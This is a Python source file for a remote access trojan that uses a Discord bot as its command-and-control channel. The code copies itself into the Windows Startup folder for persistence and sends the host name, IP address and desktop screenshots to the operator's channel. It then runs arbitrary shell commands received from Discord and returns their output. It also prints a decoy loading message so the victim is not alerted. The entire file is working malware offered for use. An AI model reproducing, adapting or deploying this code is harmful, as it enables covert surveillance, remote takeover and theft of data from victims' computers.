import os
import sys
import socket
import subprocess
import shutil
import discord
from PIL import ImageGrab  # Used to capture screenshots

# --- CONFIGURATION ---
# Discord Bot Token and Channel ID acting as the Command &amp; Control (C2) server
BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"
CHANNEL_ID = 123456789012345678  # Replace with your dedicated Discord channel ID

# Initialize Discord client with message content intent
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

def install_persistence():
    """
    Copies the running script/executable to the Windows Startup folder
    to ensure automatic execution upon system reboot.
    """
    try:
        startup_dir = os.path.join(
            os.getenv('APPDATA'), 
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )
        target_path = os.path.join(startup_dir, os.path.basename(sys.argv))
        if not os.path.exists(target_path):
            shutil.copyfile(sys.argv, target_path)
        return True
    except Exception:
        return False

def capture_screenshot(filename="desktop_capture.png"):
    """Captures the target system's screen and saves it locally."""
    img = ImageGrab.grab()
    img.save(filename)
    return filename

@client.event
async def on_ready():
    """Executes as soon as the target connects back to Discord."""
    channel = client.get_channel(CHANNEL_ID)
    if not channel:
        return

    # 1. Gather host information
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    # 2. Establish persistence
    persistence_active = install_persistence()
    pers_status = "Persistence set" if persistence_active else "Persistence failed"

    # 3. Capture initial desktop screenshot
    screen_file = capture_screenshot()

    # Send system telemetry and screenshot to Discord
    summary = (
        f"**[+] Target System Online**\n"
        f"**Host Name:** `{hostname}`\n"
        f"**Local IP:** `{local_ip}`\n"
        f"**Status:** `{pers_status}`"
    )
    
    await channel.send(summary, file=discord.File(screen_file))

    # Clean up local screenshot
    if os.path.exists(screen_file):
        os.remove(screen_file)

@client.event
async def on_message(message):
    """Listens for remote shell commands sent inside the Discord channel."""
    # Ignore messages sent by the bot itself or outside the control channel
    if message.author == client.user or message.channel.id != CHANNEL_ID:
        return

    command = message.content.strip()

    # Command: Manual screenshot trigger
    if command == "!screenshot":
        screen_file = capture_screenshot()
        await message.channel.send(file=discord.File(screen_file))
        if os.path.exists(screen_file):
            os.remove(screen_file)
        return

    # Execute incoming terminal/shell commands
    try:
        output = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, text=True
        )
        if not output:
            output = "Command executed successfully with no output."
    except subprocess.CalledProcessError as e:
        output = f"Command Error:\n{e.output}"
    except Exception as e:
        output = f"Execution Failed: {str(e)}"

    # Send response back to Discord (chunked if over 2000 chars)
    if len(output) &gt; 1900:
        for i in range(0, len(output), 1900):
            await message.channel.send(f"```\n{output[i:i+1900]}\n```")
    else:
        await message.channel.send(f"```\n{output}\n```")

if __name__ == "__main__":
    # Print harmless output in console to avoid alerting the local user
    print("Loading system dependencies... OK.")
    client.run(BOT_TOKEN)
```
